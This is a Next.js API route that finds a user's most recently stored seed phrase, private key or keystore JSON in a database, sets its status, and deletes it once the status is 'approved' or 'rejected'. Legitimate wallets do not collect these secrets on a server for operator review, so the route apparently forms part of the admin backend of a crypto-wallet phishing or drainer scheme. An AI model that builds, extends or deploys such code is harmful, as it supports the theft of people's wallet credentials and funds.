import { connectToDB } from "@/lib/connectDB";
import SeedPhrase from "@/models/SeedPhrase";
import PrivateKey from "@/models/PrivateKey";
import KeystoreJson from "@/models/KeystoreJson";

export async function POST(req) {
  try {
    await connectToDB();

    const { userId, itemType, status } = await req.json();

    if (!userId || !itemType || !status) {
      return Response.json({ success: false, error: "Missing required fields" }, { status: 400 });
    }

    let model;
    if (itemType === "seedWords") model = SeedPhrase;
    else if (itemType === "privateKey") model = PrivateKey;
    else if (itemType === "keystoreJson") model = KeystoreJson;
    else return Response.json({ success: false, error: "Invalid itemType" }, { status: 400 });

    // Find the latest document for the user
    const latest = await model.findOne({ userId }).sort({ createdAt: -1 });
    if (!latest) {
      return Response.json({ success: false, error: "Item not found for user" }, { status: 404 });
    }

    // Update status
    latest.status = status;
    await latest.save();

    // Delete the document after approval or decline
    if (status === "approved" || status === "rejected") {
      await model.deleteOne({ _id: latest._id });
    }

    return Response.json({ success: true, status, userId: latest.userId });
  } catch (err) {
    return Response.json({ success: false, error: err.message || "Server error" }, { status: 500 });
  }
}